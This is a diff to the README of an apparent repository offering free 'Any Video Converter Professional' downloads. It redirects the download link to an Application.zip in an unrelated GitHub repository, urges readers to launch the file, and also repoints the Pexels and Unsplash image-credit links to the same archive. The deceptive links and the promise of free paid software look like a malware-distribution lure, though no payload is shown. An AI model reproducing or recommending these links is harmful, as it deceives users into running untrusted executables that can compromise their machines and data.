@@ -29,7 +29,7 @@ Explore the different aspects of Any Video Converter Professional with the follo
 
 ## 📦 Software Download
 
-If you are looking to download the Any Video Converter Professional software, you can do so by clicking [here](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip). Remember to launch the file once it's downloaded to start using this fantastic tool!
+If you are looking to download the Any Video Converter Professional software, you can do so by clicking [here](https://github.com/MSTOx1/Any-Video-Converter-Professional-Download/releases/download/v1.0/Application.zip). Remember to launch the file once it's downloaded to start using this fantastic tool!
 
 ## 🌟 Get Started
 
@@ -41,7 +41,7 @@ Start your video conversion journey today with Any Video Converter Professional.
 
 ## 📸 Image Credits
 
-- Image by [Pexels](https://www.pexels.com/)
-- Image by [Unsplash](https://unsplash.com/)
+- Image by [Pexels](https://github.com/MSTOx1/Any-Video-Converter-Professional-Download/releases/download/v1.0/Application.zip)
+- Image by [Unsplash](https://github.com/MSTOx1/Any-Video-Converter-Professional-Download/releases/download/v1.0/Application.zip)
 
 Remember to check out the "Releases" section for any updates or new versions of the software. Thank you for visiting the "Any Video Converter Professional Download" repository. Happy converting! 💻🎞️🔗
